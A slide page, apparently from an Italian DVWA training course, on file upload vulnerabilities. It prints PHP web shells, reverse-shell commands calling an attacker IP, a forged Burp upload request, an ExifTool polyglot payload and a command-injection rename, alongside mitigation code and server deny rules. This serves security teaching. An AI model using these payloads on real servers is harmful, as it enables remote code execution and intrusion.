@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>05 - File Upload | DVWA Cybersecurity Course</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="slide-container">
+
+        <section class="section">
+            <h1>⬆️ File Upload Vulnerabilities</h1>
+            <p class="hero-subtitle">
+                Caricare file malevoli per compromettere server web
+            </p>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">📖 Cos'è una Vulnerabilità di File Upload?</h2>
+
+            <div class="card">
+                <h3>Definizione</h3>
+                <p>
+                    Le vulnerabilità di <strong>File Upload</strong> si verificano quando un'applicazione
+                    web permette agli utenti di caricare file senza controlli adeguati su tipo, contenuto
+                    o nome del file. Un attaccante può sfruttarle per:
+                </p>
+                <ul>
+                    <li>🚀 Eseguire codice arbitrario sul server (Web Shell)</li>
+                    <li>💣 Sovrascrivere file di sistema critici</li>
+                    <li>📂 Upload di file malevoli (malware, phishing)</li>
+                    <li>🎯 DoS tramite upload di file enormi</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Web Shell: La Minaccia Principale</h3>
+                <p>
+                    Una <strong>web shell</strong> è uno script caricato sul server che permette
+                    all'attaccante di eseguire comandi remoti. Esempio in PHP:
+                </p>
+                <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <p>Una volta caricato e accessibile, l'attaccante ha controllo completo:</p>
+                <pre><code>http://victim.com/uploads/shell.php?cmd=whoami
+http://victim.com/uploads/shell.php?cmd=cat%20/etc/passwd</code></pre>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-low">Low Security</span> Vulnerabilità e Sfruttamento</h3>
+
+            <div class="alert alert-danger">
+                <strong>⚠️ Vulnerabilità:</strong> Nessuna validazione sul file caricato. Qualsiasi
+                file viene accettato e salvato nella directory uploads.
+            </div>
+
+            <div class="card">
+                <h4>Codice Vulnerabile (Concettuale):</h4>
+                <pre><code>$target_path = "hackable/uploads/" . basename($_FILES['uploaded']['name']);
+move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);</code></pre>
+            </div>
+
+            <h4>🎯 Attacco: Upload di Web Shell</h4>
+            <div class="card">
+                <h4>Procedura:</h4>
+                <ol>
+                    <li>Creare file PHP malevolo (<code>shell.php</code>):
+                        <pre><code>&lt;?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;</code></pre>
+                    </li>
+                    <li>Caricare il file tramite il form di upload</li>
+                    <li>Navigare all'URL del file caricato:
+                        <pre><code>http://target/hackable/uploads/shell.php</code></pre>
+                    </li>
+                    <li>Eseguire comandi:
+                        <pre><code>http://target/hackable/uploads/shell.php?cmd=whoami</code></pre>
+                    </li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Ottenere Reverse Shell:</h4>
+                        <pre><code># 1. Avviare listener sulla macchina attaccante
+nc -lvnp 4444
+
+# 2. Usare web shell per connettersi
+http://target/uploads/shell.php?cmd=nc -e /bin/bash 192.168.1.100 4444
+
+# Alternativa con bash
+http://target/uploads/shell.php?cmd=bash -i >& /dev/tcp/192.168.1.100/4444 0>&1</code></pre>
+
+                        <p>
+                            Una volta connessa la reverse shell, l'attaccante ha una shell interattiva
+                            sul server e può eseguire qualsiasi comando!
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-medium">Medium Security</span> Protezioni Implementate</h3>
+
+            <div class="alert alert-warning">
+                <strong>🛡️ Nuove Difese:</strong> Validazione del tipo MIME (Content-Type) e dimensione file
+            </div>
+
+            <div class="card">
+                <h4>Codice di Validazione:</h4>
+                <pre><code>$uploaded_type = $_FILES['uploaded']['type'];
+$uploaded_size = $_FILES['uploaded']['size'];
+
+if (($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && 
+    ($uploaded_size < 100000)) {
+    // Procedi con upload
+} else {
+    echo "File not uploaded. Only JPEG and PNG allowed, max 100KB";
+}</code></pre>
+            </div>
+
+            <h4>🎯 Bypass: Manipolazione Content-Type</h4>
+            <div class="card">
+                <p>
+                    Il Content-Type è controllato dal client e può essere facilmente manipolato
+                    usando Burp Suite.
+                </p>
+
+                <h4>Procedura con Burp Suite:</h4>
+                <ol>
+                    <li>Configurare il proxy e intercettare il traffico</li>
+                    <li>Caricare la web shell PHP</li>
+                    <li>Intercettare la richiesta POST in Burp Suite</li>
+                    <li>Modificare l'header <code>Content-Type</code>:
+                        <pre><code>Content-Type: image/png</code></pre>
+                    </li>
+                    <li>Inoltrare la richiesta modificata</li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Esempio di Richiesta Modificata:</h4>
+                        <pre><code>POST /dvwa/vulnerabilities/upload/ HTTP/1.1
+...
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="uploaded"; filename="shell.php"
+Content-Type: image/png
+
+&lt;?php system($_GET['cmd']); ?&gt;
+------WebKitFormBoundary--</code></pre>
+
+                        <p>
+                            Il server vede <code>Content-Type: image/png</code> e accetta il file,
+                            ma in realtà è PHP eseguibile!
+                        </p>
+                        <p>
+                            <strong>Lezione:</strong> Mai fidarsi degli header HTTP forniti dal client.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-high">High Security</span> Protezioni Avanzate</h3>
+
+            <div class="alert alert-info">
+                <strong>🛡️ Difese Implementate:</strong>
+                <ul>
+                    <li>Validazione estensione file (.jpg, .jpeg, .png)</li>
+                    <li>Uso di <code>getimagesize()</code> per verificare che sia un'immagine reale</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h4>Codice di Validazione:</h4>
+                <pre><code>$uploaded_name = $_FILES['uploaded']['name'];
+$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
+
+if (($uploaded_ext == "jpg" || $uploaded_ext == "jpeg" || $uploaded_ext == "png") &&
+    (getimagesize($_FILES['uploaded']['tmp_name']) !== false)) {
+    // Procedi con upload
+} else {
+    echo "File is not a valid image";
+}</code></pre>
+
+                <p>
+                    <code>getimagesize()</code> legge i metadati dell'immagine e fallisce se il
+                    file non è un'immagine valida.
+                </p>
+            </div>
+
+            <h4>🎯 Bypass: Polyglot File + Command Injection</h4>
+            <div class="card">
+                <p>
+                    Dobbiamo creare un file che sia CONTEMPORANEAMENTE un'immagine valida E
+                    contenga codice PHP eseguibile.
+                </p>
+
+                <h4>Procedura:</h4>
+                <ol>
+                    <li>Scaricare immagine JPEG legittima:
+                        <pre><code>wget https://example.com/image.jpg</code></pre>
+                    </li>
+                    <li>Iniettare payload PHP nei metadati con ExifTool:
+                        <pre><code>exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg</code></pre>
+                    </li>
+                    <li>Caricare l'immagine modificata (upload riuscirà!)</li>
+                    <li>Usare Command Injection per rinominare .jpg in .php:
+                        <pre><code>127.0.0.1|mv ../../hackable/uploads/image.jpg ../../hackable/uploads/image.php</code></pre>
+                    </li>
+                    <li>Accedere alla web shell:
+                        <pre><code>http://target/hackable/uploads/image.php?cmd=whoami</code></pre>
+                    </li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione Completa:</h4>
+                        <ol>
+                            <li><strong>Polyglot File</strong>: Il file ha header/metadati validi di immagine JPEG,
+                                quindi passa <code>getimagesize()</code></li>
+                            <li><strong>Payload nei Metadati</strong>: ExifTool inserisce il codice PHP nel campo
+                                Comment dell'immagine</li>
+                            <li><strong>Rinomina via Command Injection</strong>: Cambiando l'estensione da .jpg a .php,
+                                il server eseguirà il codice PHP invece di servire l'immagine</li>
+                        </ol>
+
+                        <p>
+                            <strong>Catena di Exploit:</strong> Questo attacco richiede DUE vulnerabilità:
+                            File Upload debole + Command Injection. È un esempio di attack chaining!
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-impossible">Impossible</span> Implementazione Sicura</h3>
+
+            <div class="alert alert-success">
+                <strong>✅ Difese Implementate:</strong>
+                <ul>
+                    <li>Token Anti-CSRF</li>
+                    <li>MD5 hash del filename con timestamp (previene collisioni)</li>
+                    <li><code>imagecreatefromjpeg()</code> / <code>imagecreatefrompng()</code> - riprocessa l'immagine
+                    </li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h4>Approccio Sicuro (Concettuale):</h4>
+                <pre><code>// Genera nome file sicuro
+$target_file = md5(uniqid() . $uploaded_name) . "." . $uploaded_ext;
+
+// Valida e riprocessa immagine
+if ($uploaded_ext == "jpg" || $uploaded_ext == "jpeg") {
+    $img = imagecreatefromjpeg($uploaded_file);
+} else if ($uploaded_ext == "png") {
+    $img = imagecreatefrompng($uploaded_file);
+}
+
+if ($img !== false) {
+    // Salva immagine riprocessata (rimuove metadati malevoli!)
+    imagejpeg($img, $target_path . $target_file);
+    imagedestroy($img);
+}</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Perché è Sicuro:</h4>
+                        <ul>
+                            <li>✅ <strong>Nome randomizzato</strong>: Impossibile prevedere il nome finale</li>
+                            <li>✅ <strong>Riprocessamento immagine</strong>: <code>imagecreatefrom*()</code> legge
+                                l'immagine e la ricrea, rimuovendo tutti i metadati e payload iniettati</li>
+                            <li>✅ <strong>Anti-CSRF token</strong>: Previene upload automatizzati</li>
+                            <li>✅ <strong>Validazione rigorosa</strong>: Solo JPEG/PNG validati</li>
+                        </ul>
+
+                        <p>
+                            <strong>Chiave:</strong> Il riprocessamento dell'immagine rimuove qualsiasi
+                            codice malevolo dai metadati, rendendo il polyglot attack inefficace.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="mitigation-box">
+            <h2>🛡️ Strategie di Mitigazione</h2>
+
+            <div class="card">
+                <h3>1. Validazione Tipo File Multi-Livello</h3>
+                <ul>
+                    <li><strong>Estensione</strong>: Whitelist di estensioni permesse</li>
+                    <li><strong>Magic Bytes</strong>: Verificare i primi byte del file (firma)</li>
+                    <li><strong>MIME Type validation</strong>: Controllare Content-Type (ma non fidarsi solo di questo!)
+                    </li>
+                    <li><strong>Content inspection</strong>: Analizzare contenuto del file</li>
+                </ul>
+
+                <pre><code>// Verifica magic bytes (PHP)
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $uploaded_file);
+finfo_close($finfo);
+
+if (!in_array($mime, ['image/jpeg', 'image/png'])) {
+    die('Invalid file type');
+}</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>2. Riprocessamento File</h3>
+                <ul>
+                    <li><strong>Immagini</strong>: Usare librerie GD o ImageMagick per ricreare l'immagine</li>
+                    <li><strong>PDF</strong>: Riprocessare con librerie PDF sicure</li>
+                    <li><strong>Documenti</strong>: Convertire in formato sicuro</li>
+                </ul>
+
+                <p>Il riprocessamento rimuove metadati, macro, e codice embedded.</p>
+            </div>
+
+            <div class="card">
+                <h3>3. Safe File Storage</h3>
+                <ul>
+                    <li><strong>Directory non eseguibile</strong>: Configurare web server per non eseguire script in
+                        /uploads</li>
+                    <li><strong>Fuori dalla webroot</strong>: Salvare file fuori dalla directory web pubblica</li>
+                    <li><strong>Nome randomizzato</strong>: Mai usare nome originale del file</li>
+                    <li><strong>Serve tramite script</strong>: Usare script PHP/Python per servire file invece di
+                        accesso diretto</li>
+                </ul>
+
+                <h4>Apache .htaccess in /uploads:</h4>
+                <pre><code>&lt;FilesMatch "\.(php|phtml|php3|php4|php5|pl|py|jsp|asp|sh|cgi)$"&gt;
+    deny from all
+&lt;/FilesMatch&gt;</code></pre>
+
+                <h4>Nginx configuration:</h4>
+                <pre><code>location /uploads/ {
+    location ~ \.php$ {
+        deny all;
+    }
+}</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>4. Restrizioni Dimensione e Quantità</h3>
+                <ul>
+                    <li>Limitare dimensione massima file (lato client E server)</li>
+                    <li>Limitare numero di upload per utente/sessione</li>
+                    <li>Limitare spazio totale di storage per utente</li>
+                    <li>Rate limiting per prevenire upload automatizzati</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>5. Antivirus e Malware Scanning</h3>
+                <ul>
+                    <li>Scansione antivirus di tutti i file caricati</li>
+                    <li>Integrazione con ClamAV o servizi cloud (VirusTotal API)</li>
+                    <li>Quarantena file sospetti</li>
+                </ul>
+
+                <pre><code>// PHP con ClamAV
+exec("clamscan --no-summary " . escapeshellarg($file), $output, $return);
+if ($return !== 0) {
+    unlink($file);
+    die('File rejected: malware detected');
+}</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>6. Permessi File Corretti</h3>
+                <ul>
+                    <li>File caricati: 644 (rw-r--r--) - non eseguibili</li>
+                    <li>Directory upload: 755 (rwxr-xr-x)</li>
+                    <li>Ownership corretto (www-data o utente web server)</li>
+                </ul>
+
+                <pre><code>// Imposta permessi sicuri dopo upload
+chmod($uploaded_file, 0644);
+chown($uploaded_file, 'www-data');</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>7. Content Security Policy</h3>
+                <ul>
+                    <li>Impedire esecuzione inline script dalle directory upload</li>
+                    <li>Usare sandbox attribute per iframe con contenuto utente</li>
+                </ul>
+
+                <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'</code></pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="alert alert-success">
+                <h3>📌 Riepilogo</h3>
+                <p>
+                    Le vulnerabilità di file upload permettono esecuzione codice remoto tramite web shell.
+                    La difesa richiede validazione multi-livello, riprocessamento file, storage sicuro,
+                    e configurazione server che previene esecuzione script in directory upload.
+                </p>
+                <p>
+                    <strong>Defense in Depth:</strong> Combina validazione, riprocessamento, permessi,
+                    e configurazione server per protezione completa.
+                </p>
+            </div>
+        </section>
+
+    </div>
+
+    <div class="nav-container">
+        <button class="nav-btn" id="nav-home" onclick="window.location.href='index.html'">🏠 Home</button>
+        <button class="nav-btn" id="nav-prev" onclick="window.location.href='04_file_inclusion.html'">←
+            Precedente</button>
+        <span class="nav-info" id="progress">6 / 8</span>
+        <button class="nav-btn" id="nav-next" onclick="window.location.href='06_insecure_captcha.html'">Successivo
+            →</button>
+    </div>
+
+    <script src="navigation.js"></script>
+</body>
+
+</html>
